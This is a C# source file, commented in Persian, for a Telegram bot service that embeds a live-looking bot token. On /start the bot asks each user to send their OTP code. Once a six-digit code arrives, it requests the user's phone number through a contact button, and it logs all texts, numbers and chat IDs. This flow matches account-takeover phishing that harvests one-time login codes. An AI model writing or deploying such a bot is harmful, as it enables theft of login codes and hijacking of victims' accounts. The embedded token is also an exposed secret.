using System.Text.Json.Serialization;
using System.Text;
using System.Text.Json;


public class TelegramBotService
{
    private readonly string _botToken;
    private readonly HttpClient _httpClient;

    public TelegramBotService()
    {
        _botToken = "7741224293:AAFskindJigOqBgaL6JbQZppvpos6PXAsF0";
        _httpClient = new HttpClient();

        // توی ctor چیزی نمی‌فرستیم چون دکمه‌ها به چت خاص وابسته‌ان
        // تنظیم دکمه‌ها توی GetAllMessagesAsync برای هر کاربر جدید انجام می‌شه
    }

    // ارسال دکمه "ارسال کد" برای کاربر جدید
    private async Task SendWelcomeMessageAsync(long chatId)
    {
        string url = $"https://api.telegram.org/bot{_botToken}/sendMessage";
        var payload = new
        {
            chat_id = chatId,
            text = "لطفاً کد OTP را ارسال کنید:",
            reply_markup = new
            {
                keyboard = new[]
                {
                    new[] { new { text = "ارسال کد" } }
                },
                one_time_keyboard = true,
                resize_keyboard = true
            }
        };
        var json = JsonSerializer.Serialize(payload);
        var content = new StringContent(json, Encoding.UTF8, "application/json");
        await _httpClient.PostAsync(url, content);
    }

    // ارسال دکمه "ارسال شماره" بعد از دریافت کد
    private async Task SendContactRequestAsync(long chatId)
    {
        // پاک کردن دکمه‌های قبلی
        string removeUrl = $"https://api.telegram.org/bot{_botToken}/sendMessage";
        var removePayload = new
        {
            chat_id = chatId,
            text = "کد دریافت شد، حالا شماره را ارسال کنید:",
            reply_markup = new { remove_keyboard = true }
        };
        var removeJson = JsonSerializer.Serialize(removePayload);
        var removeContent = new StringContent(removeJson, Encoding.UTF8, "application/json");
        await _httpClient.PostAsync(removeUrl, removeContent);

        // ارسال دکمه جدید
        string url = $"https://api.telegram.org/bot{_botToken}/sendMessage";
        var payload = new
        {
            chat_id = chatId,
            text = "لطفاً شماره تلفن خود را ارسال کنید:",
            reply_markup = new
            {
                keyboard = new[]
                {
                    new[] { new { text = "ارسال شماره", request_contact = true } }
                },
                one_time_keyboard = true,
                resize_keyboard = true
            }
        };
        var json = JsonSerializer.Serialize(payload);
        var content = new StringContent(json, Encoding.UTF8, "application/json");
        await _httpClient.PostAsync(url, content);
    }

    // گرفتن همه پیام‌ها و تنظیم دکمه‌ها برای کل ربات
    public async Task<List<MessageInfo>> GetAllMessagesAsync()
    {
        var messages = new List<MessageInfo>();
        long offset = 0;

        while (true)
        {
            string url = $"https://api.telegram.org/bot{_botToken}/getUpdates?offset={offset}&timeout=10";
            var response = await _httpClient.GetAsync(url);
            var json = await response.Content.ReadAsStringAsync();
            var result = JsonSerializer.Deserialize<TelegramResponse>(json);

            if (!result.Ok || result.Result.Length == 0)
                break;

            foreach (var update in result.Result)
            {
                if (update.Message != null)
                {
                    var messageInfo = new MessageInfo
                    {
                        MessageId = update.Message.MessageId,
                        PhoneNumber = update.Message.Contact?.PhoneNumber ?? "No contact",
                        Text = update.Message.Text ?? "No text",
                        Date = DateTimeOffset.FromUnixTimeSeconds(update.Message.Date).DateTime,
                        ChatId = update.Message.Chat.Id
                    };
                    messages.Add(messageInfo);

                    // وقتی کاربر چت رو شروع می‌کنه یا /start می‌زنه
                    if (messageInfo.Text == "/start")
                    {
                        await SendWelcomeMessageAsync(messageInfo.ChatId);
                    }
                    // اگه "ارسال کد" رو زد، منتظر کد می‌مونیم
                    else if (messageInfo.Text == "ارسال کد")
                    {
                        continue; // منتظر کد OTP می‌مونیم
                    }
                    // اگه کد OTP فرستاد
                    else if (!string.IsNullOrEmpty(messageInfo.Text) && messageInfo.Text.Length == 6 && messageInfo.Text.All(char.IsDigit))
                    {
                        await SendContactRequestAsync(messageInfo.ChatId);
                    }
                }
                offset = update.UpdateId + 1;
            }
        }

        return messages;
    }
}


public class MessageInfo
{
    public int MessageId { get; set; }
    public string PhoneNumber { get; set; }
    public string Text { get; set; }
    public DateTime Date { get; set; }
    public long ChatId { get; set; } // اضافه شده برای ارسال پیام
}

public class TelegramMessage
{
    [JsonPropertyName("message_id")]
    public int MessageId { get; set; }

    [JsonPropertyName("text")]
    public string Text { get; set; }

    [JsonPropertyName("date")]
    public long Date { get; set; }

    [JsonPropertyName("contact")]
    public TelegramContact Contact { get; set; }

    [JsonPropertyName("chat")]
    public TelegramChat Chat { get; set; } // اضافه شده
}

public class TelegramChat
{
    [JsonPropertyName("id")]
    public long Id { get; set; }
}


public class TelegramUpdate
{
    [JsonPropertyName("update_id")]
    public long UpdateId { get; set; }

    [JsonPropertyName("message")]
    public TelegramMessage Message { get; set; }
}
 
public class TelegramContact
{
    [JsonPropertyName("phone_number")]
    public string PhoneNumber { get; set; }
}

public class TelegramResponse
{
    public bool Ok { get; set; }
    public TelegramUpdate[] Result { get; set; }
}